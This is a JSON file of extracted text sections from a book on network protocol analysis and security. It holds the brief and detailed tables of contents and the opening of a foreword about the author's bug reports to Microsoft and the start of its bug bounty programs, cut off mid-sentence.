[
  {
    "input": "Brief Contents\r",
    "output": "BRIEf CONTENTS\nForeword by Katie Moussouris . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xv\nAcknowledgments  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xvii\nIntroduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xix\nChapter 1: The Basics of Networking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .1\nChapter 2: Capturing Application Traffic  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11\nChapter 3: Network Protocol Structures  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37\nChapter 4: Advanced Application Traffic Capture  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 63\nChapter 5: Analysis from the Wire . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .79\nChapter 6: Application Reverse Engineering  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 111\nChapter 7: Network Protocol Security . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .145\nChapter 8: Implementing the Network Protocol  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 179\nChapter 9: The Root Causes of Vulnerabilities  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 207\nChapter 10: Finding and Exploiting Security Vulnerabilities . . . . . . . . . . . . . . . . . . . . . . .233\nAppendix: Network Protocol Analysis Toolkit . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .277\nIndex  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 293"
  },
  {
    "input": "Contents in Detail\r",
    "output": "CONTENTS IN D E TAIL\nForeword by katie Moussouris xv\nacknowledgMents xvii\nintroduction xix\nWhy Read This Book?  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xx\nWhat’s in This Book?  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xx\nHow to Use This Book . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxii\nContact Me . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxii\n1\nthe Basics oF networking 1\nNetwork Architecture and Protocols  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1\nThe Internet Protocol Suite . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2\nData Encapsulation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\nHeaders, Footers, and Addresses  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\nData Transmission . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 6\nNetwork Routing  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7\nMy Model for Network Protocol Analysis  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8\nFinal Words  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10\n2\ncapturing application traFFic 11\nPassive Network Traffic Capture  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12\nQuick Primer for Wireshark . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12\nAlternative Passive Capture Techniques . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14\nSystem Call Tracing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14\nThe strace Utility on Linux . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16\nMonitoring Network Connections with DTrace  . . . . . . . . . . . . . . . . . . . . . . . 16\nProcess Monitor on Windows . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18\nAdvantages and Disadvantages of Passive Capture . . . . . . . . . . . . . . . . . . . . . . . . . . 19\nActive Network Traffic Capture  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\nNetwork Proxies  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\nPort-Forwarding Proxy  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21\nSOCKS Proxy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24\nHTTP Proxies . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29\nForwarding an HTTP Proxy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29\nReverse HTTP Proxy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 32\nFinal Words  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35\n3\nnetwork protocol structures 37\nBinary Protocol Structures  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38\nNumeric Data . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38\nBooleans  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41\nBit Flags . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41\nBinary Endian  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41\nText and Human-Readable Data  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 42\nVariable Binary Length Data . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 47\nDates and Times  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 49\nPOSIX/Unix Time  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 50\nWindows FILETIME  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 50\nTag, Length, Value Pattern . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 50\nMultiplexing and Fragmentation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 51\nNetwork Address Information  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 52\nStructured Binary Formats  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 53\nText Protocol Structures . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 54\nNumeric Data . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 55\nText Booleans . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 55\nDates and Times . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 55\nVariable-Length Data . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56\nStructured Text Formats  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56\nEncoding Binary Data . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 59\nHex Encoding . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 59\nBase64  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 60\nFinal Words  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 62\n4\nadvanced application traFFic capture 63\nRerouting Traffic . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 64\nUsing Traceroute . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 64\nRouting Tables  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 65\nConfiguring a Router  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 66\nEnabling Routing on Windows  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 67\nEnabling Routing on *nix . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 67\nNetwork Address Translation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 68\nEnabling SNAT . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 68\nConfiguring SNAT on Linux  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 69\nEnabling DNAT  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 70\nForwarding Traffic to a Gateway . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 71\nDHCP Spoofing  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 71\nARP Poisoning  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 74\nFinal Words  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 77\n5\nanalysis FroM the wire 79\nThe Traffic-Producing Application: SuperFunkyChat  . . . . . . . . . . . . . . . . . . . . . . . . . . 80\nStarting the Server . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 80\nStarting Clients . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 80\nCommunicating Between Clients . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 81\nx Contents in Detail\nA Crash Course in Analysis with Wireshark  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 81\nGenerating Network Traffic and Capturing Packets . . . . . . . . . . . . . . . . . . . . 83\nBasic Analysis  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 84\nReading the Contents of a TCP Session  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 85\nIdentifying Packet Structure with Hex Dump . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 86\nViewing Individual Packets . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 87\nDetermining the Protocol Structure . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 88\nTesting Our Assumptions  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 89\nDissecting the Protocol with Python  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 90\nDeveloping Wireshark Dissectors in Lua  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 95\nCreating the Dissector  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 98\nThe Lua Dissection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 99\nParsing a Message Packet  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 100\nUsing a Proxy to Actively Analyze Traffic  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 103\nSetting Up the Proxy  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 103\nProtocol Analysis Using a Proxy  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 105\nAdding Basic Protocol Parsing  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 107\nChanging Protocol Behavior . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 108\nFinal Words  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 110\n6\napplication reverse engineering 111\nCompilers, Interpreters, and Assemblers  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 112\nInterpreted Languages . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 112\nCompiled Languages . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 113\nStatic vs . Dynamic Linking  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 113\nThe x86 Architecture  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 114\nThe Instruction Set Architecture  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 114\nCPU Registers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 116\nProgram Flow . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 118\nOperating System Basics . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 119\nExecutable File Formats  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 119\nSections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 120\nProcesses and Threads . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 120\nOperating System Networking Interface . . . . . . . . . . . . . . . . . . . . . . . . . . . 121\nApplication Binary Interface . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 123\nStatic Reverse Engineering  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 125\nA Quick Guide to Using IDA Pro Free Edition . . . . . . . . . . . . . . . . . . . . . . . 125\nAnalyzing Stack Variables and Arguments . . . . . . . . . . . . . . . . . . . . . . . . . 128\nIdentifying Key Functionality  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 129\nDynamic Reverse Engineering  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 134\nSetting Breakpoints  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 135\nDebugger Windows  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 135\nWhere to Set Breakpoints? . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 137\nReverse Engineering Managed Languages  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 137\n .NET Applications . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 137\nUsing ILSpy  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 138\nJava Applications  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 141\nDealing with Obfuscation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 143\nReverse Engineering Resources  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 144\nFinal Words  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 144\nContents in Detail xi\n7\nnetwork protocol security 145\nEncryption Algorithms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 146\nSubstitution Ciphers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 147\nXOR Encryption  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 148\nRandom Number Generators . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 149\nSymmetric Key Cryptography  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 149\nBlock Ciphers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 150\nBlock Cipher Modes  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 152\nBlock Cipher Padding  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 155\nPadding Oracle Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 156\nStream Ciphers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 158\nAsymmetric Key Cryptography . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 159\nRSA Algorithm  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 160\nRSA Padding  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 162\nDiffie–Hellman Key Exchange . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 162\nSignature Algorithms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 164\nCryptographic Hashing Algorithms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 164\nAsymmetric Signature Algorithms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 165\nMessage Authentication Codes . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 166\nPublic Key Infrastructure  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 169\nX .509 Certificates . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 169\nVerifying a Certificate Chain  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 170\nCase Study: Transport Layer Security  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 172\nThe TLS Handshake . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 172\nInitial Negotiation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 173\nEndpoint Authentication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 174\nEstablishing Encryption  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 175\nMeeting Security Requirements . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 176\nFinal Words  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 178\n8\niMpleMenting the network protocol 179\nReplaying Existing Captured Network Traffic . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180\nCapturing Traffic with Netcat  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180\nUsing Python to Resend Captured UDP Traffic . . . . . . . . . . . . . . . . . . . . . . . 182\nRepurposing Our Analysis Proxy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 183\nRepurposing Existing Executable Code . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 188\nRepurposing Code in  .NET Applications  . . . . . . . . . . . . . . . . . . . . . . . . . . 189\nRepurposing Code in Java Applications . . . . . . . . . . . . . . . . . . . . . . . . . . . 193\nUnmanaged Executables  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 195\nEncryption and Dealing with TLS  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 200\nLearning About the Encryption In Use . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 200\nDecrypting the TLS Traffic . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 201\nFinal Words  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 206\nxii Contents in Detail\n9\nthe root causes oF vulneraBilities 207\nVulnerability Classes . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 208\nRemote Code Execution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 208\nDenial-of-Service . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 208\nInformation Disclosure  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 209\nAuthentication Bypass  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 209\nAuthorization Bypass . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 209\nMemory Corruption Vulnerabilities . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 210\nMemory-Safe vs . Memory-Unsafe Programming Languages  . . . . . . . . . . . . . 210\nMemory Buffer Overflows  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 210\nOut-of-Bounds Buffer Indexing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 216\nData Expansion Attack . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 217\nDynamic Memory Allocation Failures . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 217\nDefault or Hardcoded Credentials  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 218\nUser Enumeration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 218\nIncorrect Resource Access . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 219\nCanonicalization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 220\nVerbose Errors  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 221\nMemory Exhaustion Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 222\nStorage Exhaustion Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 223\nCPU Exhaustion Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 224\nAlgorithmic Complexity  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 224\nConfigurable Cryptography  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 226\nFormat String Vulnerabilities  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 227\nCommand Injection  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 228\nSQL Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 228\nText-Encoding Character Replacement  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 229\nFinal Words  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 231\n10\nFinding and exploiting security vulneraBilities 233\nFuzz Testing  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 234\nThe Simplest Fuzz Test . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 234\nMutation Fuzzer  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 235\nGenerating Test Cases . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 235\nVulnerability Triaging . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 236\nDebugging Applications  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 236\nImproving Your Chances of Finding the Root Cause of a Crash . . . . . . . . . . . 243\nExploiting Common Vulnerabilities . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 245\nExploiting Memory Corruption Vulnerabilities  . . . . . . . . . . . . . . . . . . . . . . 246\nArbitrary Memory Write Vulnerability  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 253\nWriting Shell Code  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 255\nGetting Started . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 256\nSimple Debugging Technique . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 258\nCalling System Calls  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 259\nContents in Detail xiii\nExecuting the Other Programs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 263\nGenerating Shell Code with Metasploit  . . . . . . . . . . . . . . . . . . . . . . . . . . . 265\nMemory Corruption Exploit Mitigations . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 266\nData Execution Prevention  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 267\nReturn-Oriented Programming Counter-Exploit . . . . . . . . . . . . . . . . . . . . . . . 268\nAddress Space Layout Randomization (ASLR) . . . . . . . . . . . . . . . . . . . . . . . 270\nDetecting Stack Overflows with Memory Canaries  . . . . . . . . . . . . . . . . . . . 273\nFinal Words  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 276\nnetwork protocol analysis toolkit 277\nPassive Network Protocol Capture and Analysis Tools  . . . . . . . . . . . . . . . . . . . . . . . 278\nMicrosoft Message Analyzer  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 278\nTCPDump and LibPCAP  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 278\nWireshark  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 279\nActive Network Capture and Analysis  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 280\nCanape . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 280\nCanape Core . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 281\nMallory  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 281\nNetwork Connectivity and Protocol Testing  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 282\nHping  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 282\nNetcat . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 282\nNmap  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 282\nWeb Application Testing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 283\nBurp Suite  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 283\nZed Attack Proxy (ZAP)  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 284\nMitmproxy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 284\nFuzzing, Packet Generation, and\nVulnerability Exploitation Frameworks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 285\nAmerican Fuzzy Lop (AFL)  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 285\nKali Linux . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 286\nMetasploit Framework . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 286\nScapy  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 287\nSulley  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 287\nNetwork Spoofing and Redirection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 287\nDNSMasq  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 287\nEttercap . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 287\nExecutable Reverse Engineering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 288\nJava Decompiler (JD) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 288\nIDA Pro  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 289\nHopper  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 289\nILSpy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 290\n .NET Reflector . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 290\nindex 293\nxiv Contents in Detail"
  },
  {
    "input": "Foreword",
    "output": "fORE WORD\nWhen I first met James Forshaw, I worked in what\nPopular Science described in 2007 as one of the\ntop ten worst jobs in science: a “Microsoft Security\nGrunt.” This was the broad-swath label the magazine\nused for anyone working in the Microsoft Security\nResponse Center (MSRC). What positioned our jobs\nas worse than “whale-feces researcher” but somehow better than “elephant\nvasectomist” on this list (so famous among those of us who suffered in\nRedmond, WA, that we made t-shirts) was the relentless drumbeat of\nincoming security bug reports in Microsoft products.\nIt was here in MSRC that James, with his keen and creative eye toward\nthe uncommon and overlooked, first caught my attention as a security\nstrategist. James was the author of some of the most interesting security\nbug reports. This was no small feat, considering the MSRC was receiving\nupwards of 200,000 security bug reports per year from security researchers.\nJames was finding not only simple bugs—he had taken a look at the .NET\nframework and found architecture-level issues. While these architecture-\nlevel bugs were harder to address in a simple patch, they were much more\nvaluable to Microsoft and its customers.\nFast-forward to the creation of Microsoft’s first bug bounty programs,\nwhich I started at the company in June of 2013. We had three programs in\nthat initial batch of bug bounties—programs that promised to pay security\nresearchers like James cash in exchange for reporting the most serious\nbugs to Microsoft. I knew that for these programs to prove their efficacy,\nwe needed high-quality security bugs to be turned in.\nIf we built it, there was no guarantee that the bug finders would come.\nWe knew we were competing for some of the most highly skilled bug hunt-\ning eyes in the world. Numerous other cash rewards were available, and\nnot all of the bug markets were for defense. Nation-states and criminals\nhad a well-established offense market for bugs and exploits, and Microsoft\nwas relying on the 